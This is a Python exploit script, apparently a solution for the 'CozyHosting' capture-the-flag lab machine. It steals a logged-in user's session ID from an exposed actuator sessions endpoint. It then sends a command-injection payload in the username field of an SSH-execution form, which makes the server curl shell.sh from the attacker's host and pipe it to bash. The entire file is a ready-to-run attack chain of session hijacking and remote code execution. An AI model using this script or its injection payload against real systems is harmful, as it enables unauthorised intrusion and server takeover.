import sys 
import requests
import json

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} LHOST")
    sys.exit(1)


url = f"http://cozyhosting.htb"

def get_session():
    res = requests.get(url+"/actuator/sessions")
    json_data = json.loads(res.text)
    for key , val in json_data.items():
        if val == "kanderson":
            return key
        
    return None

def get_shell():
    ssid = get_session();
    payload = {"host":"10.10.10.10","username":";$(curl${IFS})"+sys.argv[1]+"/shell.sh|bash"}
    cookies = {"JSESSIONID":ssid}
    res = requests.post(url+"/executessh",json=payload,cookies=cookies)
    print(res.text)

if __name__ == "__main__":
    get_shell();
